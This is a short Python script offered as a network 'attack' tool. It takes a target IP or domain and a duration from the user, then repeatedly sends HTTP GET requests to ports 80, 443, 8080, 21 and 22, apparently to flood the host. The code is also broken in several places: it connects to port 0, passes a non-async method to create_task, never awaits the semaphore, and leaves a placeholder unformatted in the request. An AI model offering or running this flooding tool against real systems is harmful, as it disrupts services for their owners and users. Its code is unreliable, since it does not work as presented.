import asyncio
import socket
from typing import Dict, Tuple

class CustomTCPProtocol(asyncio.Protocol):
    def __init__(self):
        self.queues: Dict[Tuple[str, int], asyncio.Queue] = {}
        self.destinations: Dict[Tuple[str, int], Tuple[asyncio.Queue, asyncio.Semaphore]] = {}
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print("Connection established")

    def data_received(self, data: bytes) -> None:
        # Broadcast data to all destinations' queues
        for dest in self.destinations.values():
            dest[0].put_nowait(data)

    def connection_lost(self, exc):
        if exc is not asyncio.CancelledError:
            print("Connection lost")
        for dest in self.destinations.values():
            dest[1].release()
        self.destinations.clear()

    def send_data(self, dest: Tuple[asyncio.Queue, asyncio.Semaphore], data: bytes):
        if not dest[0].empty():
            dest[1].acquire()
            dest[0].put_nowait(data)
            dest[1].release()

    def add_destination(self, dest: Tuple[str, int]):
        if dest not in self.destinations:
            self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())

async def attack(target: str, duration_minutes: int) -> None:
    status = {}

    def on_task_complete(f: asyncio.Future) -> None:
        result = f.result() if f.done() else "failed"
        status[result] = status.get(result, 0) + 1

    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_connection(lambda: CustomTCPProtocol(), target, 0)
    
    try:
        ports = [80, 443, 8080, 21, 22]
        for port in ports:
            print(f"Sending data to {target}:{port}")
            protocol.add_destination((target, port))
            transport.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())

        # Convert minutes to seconds
        end_time = loop.time() + (duration_minutes * 60)
        tasks = []
        while loop.time() < end_time:
            for dest in protocol.destinations.keys():
                task = asyncio.create_task(protocol.send_data(protocol.destinations[dest], b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"))
                task.add_done_callback(on_task_complete)
                tasks.append(task)
            await asyncio.sleep(1)

        await asyncio.gather(*tasks)
        print("Attack completed.")
        print("Status:", status)
    finally:
        transport.close()

if __name__ == "__main__":
    duration_minutes = int(input("Enter the duration of the attack in minutes: "))
    target = input("Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): ")
    print(f"Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes...")

    asyncio.run(attack(target, duration_minutes))
